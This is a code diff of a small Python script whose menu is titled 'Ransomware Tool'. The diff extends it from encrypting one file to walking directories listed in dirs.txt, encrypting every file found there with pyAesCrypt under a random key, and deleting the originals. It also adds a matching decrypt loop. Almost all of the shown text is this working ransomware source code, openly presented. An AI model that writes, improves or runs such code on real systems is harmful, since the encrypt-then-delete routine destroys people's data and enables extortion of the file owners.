@@ -6,7 +6,7 @@ import os
 
 #Define Functions
 def clear():
-  os.system('clear')
+    os.system('clear')
 
 def int_input_getter(prompt, num_range):
     while True:
@@ -24,42 +24,67 @@ def int_input_getter(prompt, num_range):
             else:
                 print("That is not an option!")
                 input("Press enter to continue...")
+
 def gen_key():
-  #Generate Symmetric Key & Store in Variable
-  clear()
-  global sym
-  passwd=''
-  for i in range (15):
-    nums = string.digits
-    passwd+=random.choice(nums)
-  for i in range (15):
-    letters = string.ascii_letters
-    passwd+=random.choice(letters)
-  l=list(passwd)
-  random.shuffle(l)
-  sym= ''.join(l)
-  print("Symmetric Key is: " + sym)
-  print()
+    #Generate Symmetric Key & Store in Variable
+    #clear()
+    global sym
+    passwd=''
+    for i in range (15):
+        nums = string.digits
+        passwd+=random.choice(nums)
+    for i in range (15):
+        letters = string.ascii_letters
+        passwd+=random.choice(letters)
+    l=list(passwd)
+    random.shuffle(l)
+    sym= ''.join(l)
+    print("Symmetric Key is: " + sym)
+    print()
+
+def enum_files():  ###NEEDS A FILE LIST FOR EACH DIR
+    #Read Target Directories from 'dir.txt' & Enumerate Them
+    f = open('dirs.txt', 'r')
+    target_dirs = f.readlines()
+    global files
+    files=[]
+    for dir in target_dirs:
+        dir_files = []
+        #Enumerate Target Directory & Populate List
+        dir_files += os.listdir(dir.strip())
+        for i in dir_files:
+          path = dir.strip() + i
+          index_of_file = dir_files.index(i)
+          dir_files[index_of_file] = path
+        files+=dir_files
 
 def encrypt():
-  #Encrypt File
-  clear()
-  global bufferSize
-  bufferSize = 64 * 1024
-  pyAesCrypt.encryptFile("data.txt", "data.txt.aes", sym, bufferSize)
-
-  #Delete Original
-  os.remove("data.txt")
-  print("Data is now encrypted")
-  print()
-
+    enum_files()
+    #Encrypt File
+    #clear()
+    global bufferSize
+    bufferSize = 64 * 1024
+    for i in files:
+        new_name=i+'.aes'
+        pyAesCrypt.encryptFile(i, new_name, sym, bufferSize)
+        #Delete Original
+        os.remove(i)
+    print("Data is now encrypted")
+    print()
 
 def decrypt():
-  #Decrypt File
-  pyAesCrypt.decryptFile("data.txt.aes", "data.txt", sym, bufferSize)
-  os.remove("data.txt.aes")
-
-
+    enum_files()
+    #Decrypt File
+    #clear()
+    global bufferSize
+    bufferSize = 64 * 1024
+    for i in files:
+        new_name=i.replace('.aes', '')
+        pyAesCrypt.decryptFile(i, new_name, sym, bufferSize)
+        #Delete Original
+        os.remove(i)
+    print("Data is now decrypted")
+    print()
 
 #Main Program
 main_menu = """Ransomware Tool
@@ -68,6 +93,7 @@ main_menu = """Ransomware Tool
 3. Decrypt
 4. Quit
 """
+
 while True:
     uio = int_input_getter(main_menu, range(1, 5))
     if uio == 1:
